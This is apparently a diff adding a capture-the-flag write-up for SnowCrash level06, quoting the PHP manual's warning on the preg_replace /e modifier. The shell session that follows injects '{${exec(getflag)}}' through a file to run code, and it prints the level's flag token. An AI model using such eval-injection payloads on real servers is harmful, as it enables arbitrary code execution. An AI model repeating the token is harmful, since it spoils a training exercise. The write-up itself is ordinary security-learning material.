@@ -1,0 +1,57 @@
+(found on http://php.net/manual/en/reference.pcre.pattern.modifiers.php)
+
+e (PREG_REPLACE_EVAL)
+	Warning
+	This feature was DEPRECATED in PHP 5.5.0, and REMOVED as of PHP 7.0.0.
+
+	If this deprecated modifier is set, preg_replace() does normal substitution of backreferences in the replacement string, evaluates it as PHP code, and uses the result for replacing the search string.
+	Single quotes, double quotes, backslashes (\) and NULL chars will be escaped by backslashes in substituted backreferences.
+	Caution
+	The addslashes() function is run on each matched backreference before the substitution takes place.
+	As such, when the backreference is used as a quoted string, escaped characters will be converted to literals.
+	However, characters which are escaped, which would normally not be converted, will retain their slashes.
+	This makes use of this modifier very complicated.
+
+	Caution
+	Make sure that replacement constitutes a valid PHP code string, otherwise PHP will complain about a parse error at the line containing preg_replace().
+
+	Caution
+	Use of this modifier is discouraged, as it can easily introduce security vulnerabilities:
+
+	<?php
+	$html = $_POST['html'];
+
+	// uppercase headings
+	$html = preg_replace(
+		'(<h([1-6])>(.*?)</h\1>)e',
+		'"<h$1>" . strtoupper("$2") . "</h$1>"',
+		$html
+	);
+	The above example code can be easily exploited by passing in a string such as <h1>{${eval($_GET[php_code])}}</h1>.
+	This gives the attacker the ability to execute arbitrary PHP code and as such gives them nearly complete access to your server.
+
+---------------------------------------------------------------------------------------------
+
+level06@SnowCrash:~$ cd ..
+
+---------------------------------------------------------------------------------------------
+
+level06@SnowCrash:/home/user$ chmod 777 level06
+
+---------------------------------------------------------------------------------------------
+
+level06@SnowCrash:~$ cd -
+/home/user/level06
+
+---------------------------------------------------------------------------------------------
+
+/bin/echo '[x {${exec(getflag)}}]' > innocent_file
+
+---------------------------------------------------------------------------------------------
+
+level06@SnowCrash:~$ ./level06 innocent_file
+PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
+
+We can se the the return of the 'getflag' function in the second error message:
+Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
